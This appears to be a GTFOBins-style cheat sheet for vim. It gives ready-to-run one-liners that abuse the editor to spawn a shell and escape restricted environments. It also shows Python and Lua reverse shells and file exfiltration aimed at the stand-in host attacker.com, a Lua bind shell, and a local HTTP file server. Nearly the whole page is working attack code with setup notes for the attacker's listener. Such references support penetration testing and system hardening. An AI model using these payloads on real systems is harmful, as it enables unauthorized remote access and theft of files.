# GTFOBin: vim

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
vim -c ':!/bin/sh'
```

```
vim --cmd ':set shell=/bin/sh|:shell'
```

This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3.

```
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

This requires that `vim` is compiled with Lua support.

```
vim -c ':lua os.execute("reset; exec sh")'
```

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Run `socat file:`tty`,raw,echo=0 tcp-listen:12345` on the attacker box to receive the shell.

```
export RHOST=attacker.com
export RPORT=12345
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
```

## Non-interactive reverse shell

It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.

```
export RHOST=attacker.com
export RPORT=12345
vim -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```

## Non-interactive bind shell

It can bind a non-interactive shell to a local port to allow remote network access.

Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.

```
export LPORT=12345
vim -c ':lua local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```

## File upload

It can exfiltrate files on the network.

This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.

```
export URL=http://attacker.com/
export LFILE=file_to_send
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
```

This requires that `vim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.

```
export LPORT=8888
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
```

Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires that `vim` is compiled with Lua support and that `lua-socket` is installed.

```
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
  t:send(d);
  t:close();'
```